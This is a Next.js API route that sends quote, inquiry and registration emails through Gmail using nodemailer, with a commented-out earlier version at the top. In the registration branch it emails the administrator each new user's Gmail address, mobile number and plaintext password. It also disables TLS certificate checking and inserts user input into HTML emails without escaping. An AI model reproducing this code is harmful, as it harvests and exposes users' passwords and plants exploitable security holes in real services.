// import { NextResponse } from 'next/server';
// import nodemailer from 'nodemailer';

// export async function POST(req: Request) {
//   try {
//     const body = await req.json();
//     // 1. Added 'email' to the destructuring (make sure frontend sends this)
//     const { fullName, email, mobile, service, message, clientName, totalAmount, pdfBase64 } = body;

//     const transporter = nodemailer.createTransport({
//       service: 'gmail',
//       auth: {
//         user: process.env.EMAIL_USER,
//         pass: process.env.EMAIL_PASS,
//       },
//       tls: {
//         rejectUnauthorized: false 
//       }
//     });

//     // 2. Determine who the recipient is. 
//     // If it's a quote, send to the user's email. If it's an inquiry, maybe send to Admin?
//     const recipient = email || process.env.EMAIL_USER;

//     let mailOptions: any = {
//       from: process.env.EMAIL_USER,
//       to: recipient, 
//     };

//     if (pdfBase64) {
//       mailOptions.subject = `Softlink Quote: ${clientName || 'Client'}`;
//       mailOptions.text = `Dear ${clientName},\n\nPlease find your requested quotation attached.\nTotal Amount: INR ${totalAmount}`;
//       mailOptions.attachments = [{
//         filename: `Quotation_${(clientName || 'Doc').replace(/\s+/g, '_')}.pdf`,
//         content: pdfBase64,
//         encoding: 'base64',
//       }];
//     } else {
//       mailOptions.subject = `New Project Request: ${service}`;
//       mailOptions.html = `
//         <div style="font-family: sans-serif; padding: 20px; border: 1px solid #25C1C5; border-radius: 15px; background-color: #f9f9f9;">
//           <h2 style="color: #25C1C5; border-bottom: 2px solid #25C1C5; padding-bottom: 10px;">Project Inquiry Details</h2>
//           <p><strong>Client Name:</strong> ${fullName}</p>
//           <p><strong>Email:</strong> ${email}</p>
//           <p><strong>Mobile Number:</strong> ${mobile}</p>
//           <p><strong>Service Interested:</strong> ${service}</p>
//           <div style="margin-top: 20px; padding: 15px; background: white; border-radius: 10px;">
//             <p><strong>Message:</strong></p>
//             <p>${message}</p>
//           </div>
//         </div>
//       `;
//     }

//     const info = await transporter.sendMail(mailOptions);
//     return NextResponse.json({ success: true, id: info.messageId }, { status: 201 });

//   } catch (error: any) {
//     // 3. Log the ACTUAL error to see what's wrong (e.g., Auth failure)
//     console.error("Nodemailer Detail:", error.message);
//     return NextResponse.json({ error: error.message || "Failed to send email" }, { status: 500 });
//   }
// }


import { NextResponse } from 'next/server';
import nodemailer from 'nodemailer';

export async function POST(req: Request) {
  try {
    const body = await req.json();
    
    // Updated destructuring to include 'clientEmail' and 'clientPassword' from your login form
    const { 
      fullName, 
      email, 
      mobile, 
      service, 
      message, 
      clientName, 
      totalAmount, 
      pdfBase64,
      clientEmail,    // From Login Form
      clientPassword, // From Login Form
      clientMobile,   // From Login Form
      type            // To identify if it's a registration or a quote
    } = body;

    const transporter = nodemailer.createTransport({
      service: 'gmail',
      host: 'smtp.gmail.com',
      port: 465,
      secure: true,
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
      },
      // --- CRITICAL UPDATES FOR SOCKET CLOSE ERRORS ---
      pool: true,              // Keeps connection open for multiple sends
      connectionTimeout: 10000, // 10 seconds
      greetingTimeout: 10000,
      socketTimeout: 15000,
      tls: {
        rejectUnauthorized: false 
      }
    });

    // Determine recipient: Use provided email or fallback to admin
    const recipient = email || clientEmail || process.env.EMAIL_USER;

    let mailOptions: any = {
      from: process.env.EMAIL_USER,
      to: process.env.EMAIL_USER, // Always notify Admin
    };

    // LOGIC 1: New User Registration (Login Form)
    if (type === "NEW_USER_REGISTRATION") {
      mailOptions.subject = `New Registration: ${clientName}`;
      mailOptions.html = `
        <div style="font-family: sans-serif; padding: 20px; border: 1px solid #7c3aed; border-radius: 15px;">
          <h2 style="color: #7c3aed;">New Client Access Noted</h2>
          <p><strong>Name:</strong> ${clientName}</p>
          <p><strong>Gmail:</strong> ${clientEmail}</p>
          <p><strong>Mobile:</strong> ${clientMobile}</p>
          <p><strong>Password:</strong> ${clientPassword}</p>
        </div>
      `;
    } 
    // LOGIC 2: Quotation with PDF
    else if (pdfBase64) {
      mailOptions.to = recipient; // Send PDF to client
      mailOptions.subject = `Softlink Quote: ${clientName || 'Client'}`;
      mailOptions.text = `Dear ${clientName},\n\nPlease find your requested quotation attached.\nTotal Amount: INR ${totalAmount}`;
      mailOptions.attachments = [{
        filename: `Quotation_${(clientName || 'Doc').replace(/\s+/g, '_')}.pdf`,
        content: pdfBase64,
        encoding: 'base64',
      }];
    } 
    // LOGIC 3: General Inquiry
    else {
      mailOptions.subject = `New Project Request: ${service}`;
      mailOptions.html = `
        <div style="font-family: sans-serif; padding: 20px; border: 1px solid #25C1C5; border-radius: 15px; background-color: #f9f9f9;">
          <h2 style="color: #25C1C5; border-bottom: 2px solid #25C1C5; padding-bottom: 10px;">Project Inquiry Details</h2>
          <p><strong>Client Name:</strong> ${fullName}</p>
          <p><strong>Email:</strong> ${email}</p>
          <p><strong>Mobile Number:</strong> ${mobile}</p>
          <p><strong>Service Interested:</strong> ${service}</p>
          <div style="margin-top: 20px; padding: 15px; background: white; border-radius: 10px;">
            <p><strong>Message:</strong></p>
            <p>${message}</p>
          </div>
        </div>
      `;
    }

    const info = await transporter.sendMail(mailOptions);
    return NextResponse.json({ success: true, id: info.messageId }, { status: 201 });

  } catch (error: any) {
    console.error("Nodemailer Detail:", error.message);
    return NextResponse.json({ error: error.message || "Failed to send email" }, { status: 500 });
  }
}